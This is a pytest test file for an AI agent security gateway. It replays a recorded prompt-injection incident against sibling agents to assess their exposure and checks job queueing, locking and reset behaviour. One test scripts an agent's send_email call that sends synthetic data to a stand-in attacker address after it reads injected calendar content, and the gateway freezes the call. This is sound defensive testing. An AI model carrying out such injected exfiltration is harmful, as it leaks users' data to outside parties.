"""Durable exposure job HTTP seams without providers or user services."""

import copy
import json
import threading
import time
from pathlib import Path
from types import SimpleNamespace

import pytest
from fastapi import FastAPI
from fastapi.testclient import TestClient

from contracts.models import ExposureJob
from engine.api import exposure as api
from engine.api import server
from engine.detonation import jobs, snapshot
from engine.gateway import gate
from engine.store import events
from tests.test_exposure import setup  # noqa: F401 - shared real-jail fixture


@pytest.fixture
def client(setup, tmp_path, monkeypatch):  # noqa: F811 - imported pytest fixture
    source, _, entry = setup
    monkeypatch.setattr(events, "DB_PATH", tmp_path / "exposure.db")
    monkeypatch.setattr(snapshot, "SNAP_DIR", tmp_path / "snapshots")
    monkeypatch.setattr(gate, "agents", {})
    monkeypatch.setattr(gate, "STOP", threading.Event())
    monkeypatch.setattr(jobs, "_pending", {})
    snapshot.SNAP_DIR.mkdir()
    (snapshot.SNAP_DIR / "inc_original.json").write_text(json.dumps(source))
    manifest = tmp_path / "candidates.json"
    manifest.write_text(json.dumps([entry, {"agent_name": "invoice", "role": "invoice",
                                          "tools": ["list_invoices", "send_email"]}]))
    monkeypatch.setenv("MIRAGE_EXPOSURE_CANDIDATES", str(manifest))
    incident = SimpleNamespace(cause_input_id="in_01")
    app = FastAPI()
    app.include_router(api.create_router(lambda incident_id: incident))
    with TestClient(app) as http:
        yield http, incident, entry


def request(client, names=None, **extra):
    http, _, entry = client
    return http.post("/incidents/inc_original/exposure-jobs", json={
        "agent_names": names or [entry["agent_name"], "invoice"],
        "actor": "synthetic operator", "reason": "Assess the sibling", **extra})


def test_create_get_list_and_original_recording_unchanged(client):
    http, _, _ = client
    source = (snapshot.SNAP_DIR / "inc_original.json").read_bytes()
    candidate_response = http.get("/incidents/inc_original/exposure-candidates")
    assert candidate_response.status_code == 200
    assert [c["status"] for c in candidate_response.json()] == ["unassessed", "not_applicable"]
    created = request(client)
    assert created.status_code == 202, created.text
    queued = ExposureJob.model_validate(created.json())
    assert queued.status == "queued" and queued.results == []
    result = http.get(f"/exposure-jobs/{queued.id}")
    assert result.status_code == 200, result.text
    job = ExposureJob.model_validate(result.json())
    deadline = time.monotonic() + 10
    while job.status in ("queued", "running") and time.monotonic() < deadline:
        time.sleep(0.02)
        result = http.get(f"/exposure-jobs/{queued.id}")
        job = ExposureJob.model_validate(result.json())
    assert job.status == "completed"
    assert [r.status for r in job.results] == ["vulnerable", "not_applicable"]
    assert job.results[0].replay_kind == "scripted"
    assert http.get("/exposure-jobs?incident_id=inc_original").json() == [result.json()]
    assert http.get("/exposure-jobs?incident_id=other").json() == []
    assert http.get("/exposure-jobs/absent").status_code == 404
    assert source == (snapshot.SNAP_DIR / "inc_original.json").read_bytes()
    assert all(e.type in ("agent.message", "human.action") for e in events.read())
    assert any(e.payload.get("actor") == "synthetic operator" for e in events.read())


@pytest.mark.parametrize("names,extra", [(["unknown"], {}), (["invoice", "invoice"], {}),
                                        ([" "], {}), (["invoice"], {"code_root": "/tmp"}),
                                        (["invoice"], {"snapshot_path": "/tmp"})])
def test_paths_unknown_names_and_duplicate_names_fail_before_scheduling(client, names, extra):
    response = request(client, names, **extra)
    assert response.status_code == 422
    assert events.read() == []


def test_missing_causal_input_and_stop_refuse_replay(client):
    _, incident, _ = client
    incident.cause_input_id = None
    assert request(client).status_code == 409
    incident.cause_input_id = "in_01"
    gate.STOP.set()
    assert request(client).status_code == 409
    assert events.read() == []


def test_orphan_job_fails_interrupted_without_running(client, monkeypatch):
    http, _, _ = client
    job = ExposureJob(id="exposure_orphan", incident_id="inc_original",
                      agent_names=["invoice"], status="running")
    api._save(job, events.read_batch()[0])
    monkeypatch.setattr(api.exposure, "evaluate", lambda *a: pytest.fail("Orphan resumed"))
    response = http.get("/exposure-jobs/exposure_orphan")
    assert response.json()["status"] == "failed"
    assert response.json()["error"] == "interrupted"


def test_old_epoch_work_cannot_write_into_reset_namespace(client, monkeypatch):
    _, _, entry = client
    epoch = events.read_batch()[0]
    job = ExposureJob(id="exposure_old", incident_id="inc_original",
                      agent_names=[entry["agent_name"]], status="queued")
    source = json.loads((snapshot.SNAP_DIR / "inc_original.json").read_text())
    events.reset()
    monkeypatch.setattr(api.exposure, "evaluate", lambda *a: pytest.fail("Stale work replayed"))
    with pytest.raises(events.StaleEpoch):
        api._work(copy.deepcopy(job), source, "in_01", [entry], epoch)
    assert events.read() == []


def test_wire_fixture_validates_without_fabricating_provenance():
    path = Path(__file__).parents[1] / "contracts/fixtures/exposure_demo.json"
    job = ExposureJob.model_validate_json(path.read_text())
    assert [r.status for r in job.results] == ["vulnerable", "not_applicable", "could_not_evaluate"]
    assert job.results[0].replay_kind == "scripted" and job.results[0].code_revision is None


def test_replay_router_never_executes_or_reads_live_receipts(client, monkeypatch):
    _, incident, _ = client
    response = request(client)
    assert response.status_code == 202
    job_id = response.json()["id"]
    app = FastAPI()
    app.include_router(api.create_router(lambda _: incident, replay=True))
    with TestClient(app) as recorded:
        assert recorded.get("/exposure-jobs").json() == []
        assert recorded.get(f"/exposure-jobs/{job_id}").status_code == 404
        assert recorded.get("/incidents/inc_original/exposure-candidates").json() == []
        assert recorded.post("/incidents/inc_original/exposure-jobs", json={
            "agent_names": ["invoice"], "actor": "operator", "reason": "test"}).status_code == 409


def test_exposure_shares_queue_and_reset_exclusion_with_other_incidents(client, monkeypatch):
    """Scripted queue concurrency is separate from the accepted model-backed sibling proof."""
    monkeypatch.setattr(server, "REPLAY", None)
    monkeypatch.setattr(server, "_live_epoch", None)
    monkeypatch.setattr(gate, "runs", {})
    http = TestClient(server.app)
    spec = {"name": "assistant", "owner": "synthetic operator",
            "tools": ["read_calendar", "send_email"],
            "allow": {"tools": ["read_calendar", "send_email"],
                      "email_to": ["operator@synthetic.example"]},
            "entrypoint": "sibling_probe:run"}
    assert http.post("/agents", json=spec).status_code == 200

    def start(name):
        response = http.post("/runs", json={"agent": name, "task": f"Synthetic task for {name}"})
        assert response.status_code == 200, response.text
        body = response.json()
        return body["run_id"], {"Authorization": f"Bearer {body['run_token']}"}

    def check(run_id, auth, tool, args):
        response = http.post("/gateway/check", headers=auth,
                             json={"run_id": run_id, "tool": tool, "args": args})
        assert response.status_code == 200, response.text
        return response.json()

    frozen_id, frozen_auth = start(spec["name"])
    read = check(frozen_id, frozen_auth, "read_calendar", {"day": "2026-10-12"})
    assert read["decision"] == "allow"
    recorded = snapshot.load("inc_original")["tool_results"][0]["result"]
    assert http.post(f"/runs/{frozen_id}/tool-results", headers=frozen_auth, json={
        "call_id": read["call_id"], "tool": "read_calendar", "result": recorded}).status_code == 204
    assert check(frozen_id, frozen_auth, "send_email", {
        "to": "attacker@evil-corp-demo.com", "subject": "Injected", "body": "Synthetic rows"
    })["decision"] == "freeze"
    incident_id = gate.runs[frozen_id].incident_id
    # Seed an existing proven verdict/cause; this test exercises concurrency, not detonation.
    events.emit("verdict.ready", {"incident_id": incident_id, "confirmed": True,
                "compromised_runs": "1/1", "policies_violated": ["P1"],
                "blast_radius": {"records": 1, "recipients": ["attacker@evil-corp-demo.com"],
                                 "secrets": [], "summary": "Synthetic existing proof"}},
                incident_id=incident_id, env="mirage")
    events.emit("bisection.completed", {"cause_input_id": "in_01"},
                incident_id=incident_id, env="mirage")
    original_incident = http.get(f"/incidents/{incident_id}").json()
    original_snapshot = (snapshot.SNAP_DIR / f"{incident_id}.json").read_bytes()
    assert http.post("/agents", json={**spec, "name": "healthy"}).status_code == 200
    healthy_id, healthy_auth = start("healthy")

    started, release = threading.Event(), threading.Event()
    def hold(_):
        started.set()
        assert release.wait(10)
    jobs.submit("inc_other", hold)
    assert started.wait(2)
    replay_started, replay_release = threading.Event(), threading.Event()
    original = api.exposure.sandbox.run_once
    def hold_replay(*args, **kwargs):
        replay_started.set()
        assert replay_release.wait(10)
        return original(*args, **kwargs)
    monkeypatch.setattr(api.exposure.sandbox, "run_once", hold_replay)
    try:
        created = http.post(f"/incidents/{incident_id}/exposure-jobs", json={
            "agent_names": [client[2]["agent_name"], "invoice"],
            "actor": "synthetic operator", "reason": "Scripted healthy-run concurrency"})
        assert created.status_code == 202 and created.json()["status"] == "queued"
        assert not replay_started.is_set()
        # The gateway's shared lock remains available while the other sandbox is running.
        assert jobs.lock.acquire(blocking=False)
        jobs.lock.release()
        with pytest.raises(jobs.Busy), jobs.resetting():
            pytest.fail("Reset entered during active sandbox work")
        release.set()
        assert replay_started.wait(3)
        assert http.get(f"/exposure-jobs/{created.json()['id']}").json()["status"] == "running"
        assert http.get(f"/runs/{healthy_id}").json()["status"] == "running"
        decision = check(healthy_id, healthy_auth, "read_calendar", {"day": "2026-10-13"})
        assert decision["decision"] == "allow"
        assert http.post(f"/runs/{healthy_id}/tool-results", headers=healthy_auth, json={
            "call_id": decision["call_id"], "tool": "read_calendar",
            "result": {"events": []}}).status_code == 204
        assert gate.runs[healthy_id].tool_results[0]["args"] == {"day": "2026-10-13"}
        assert http.post(f"/runs/{healthy_id}/complete", headers=healthy_auth).json()["status"] == "completed"
        assert http.get(f"/runs/{frozen_id}").json()["status"] == "frozen"
        assert http.get(f"/incidents/{incident_id}").json() == original_incident
        assert (snapshot.SNAP_DIR / f"{incident_id}.json").read_bytes() == original_snapshot
    finally:
        release.set()
        replay_release.set()
    jobs.shutdown()
    history = events.read()
    own = [e for e in history if e.incident_id == incident_id and "exposure_job" in e.payload]
    assert own
    assert not any("sandbox_job" in e.payload or e.type.startswith("detonation.") for e in own)
    final = http.get(f"/exposure-jobs/{created.json()['id']}").json()
    assert final["status"] == "completed", final
    assert [r["status"] for r in final["results"]] == ["vulnerable", "not_applicable"]
    assert final["results"][0]["replay_kind"] == "scripted"
    assert http.get(f"/incidents/{incident_id}").json() == original_incident
    assert http.get(f"/runs/{frozen_id}").json()["status"] == "frozen"
    assert (snapshot.SNAP_DIR / f"{incident_id}.json").read_bytes() == original_snapshot
